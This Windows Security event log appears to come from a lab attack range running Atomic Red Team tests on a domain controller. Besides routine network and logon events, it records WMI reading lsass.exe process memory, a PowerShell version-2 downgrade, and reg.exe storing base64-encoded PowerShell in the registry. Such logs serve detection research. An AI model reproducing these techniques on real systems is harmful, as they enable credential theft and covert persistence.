	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382451
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		64227
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382450
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64227
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382449
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64227
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:29 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382460
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		55691
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:29 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382459
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		55691
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:29 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382458
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		64227
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382468
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FF6C12

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382467
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x4FF6C12
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{CC923A93-F001-0671-4717-F77291746201}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		55159

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382466
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FF6C12

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382465
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		852
	Application Name:	\device\harddiskvolume1\windows\system32\lsass.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55159
	Destination Address:	::1
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382464
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2684
	Application Name:	\device\harddiskvolume1\windows\adws\microsoft.activedirectory.webservices.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55159
	Destination Address:	::1
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382463
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2684
	Application Name:	\device\harddiskvolume1\windows\adws\microsoft.activedirectory.webservices.exe

Network Information:
	Source Address:		::
	Source Port:		55159
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382462
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55158
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382461
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55158
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:32 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382469
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59490
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382473
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61690
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382472
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59736
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382471
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55160
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382470
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55160
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382482
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x264
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382481
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0xcc4
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0xFFFFFFFF
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382480
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0xa98
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0xFFFFFFFF
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382479
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1080
	Process Name:	C:\Windows\System32\mshta.exe
	Exit Status:	0xFFFFFFFF
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382478
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x26c
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382477
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x258
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382476
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x220
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382475
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E4

Process Information:
	New Process ID:		0x1ad4
	New Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x24c
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382474
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1744
	Process Name:	C:\Windows\System32\notepad.exe
	Exit Status:	0x0
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382497
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1d18
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382496
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1890
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0xFFFF0000
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382495
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1890
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1d18
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -version 2 -Command Write-Host 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382494
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1d18
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {powershell.exe -version 2 -Command Write-Host $PSVersion} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382493
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1b94
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382492
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x21b4
	Process Name:	C:\Windows\System32\reg.exe
	Exit Status:	0x0
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382491
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x21b4
	New Process Name:	C:\Windows\System32\reg.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1b94
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\reg.exe" add HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam /v ART /t REG_SZ /d U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382490
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59925
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382489
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382488
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382487
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:40 PM
LogName=Security
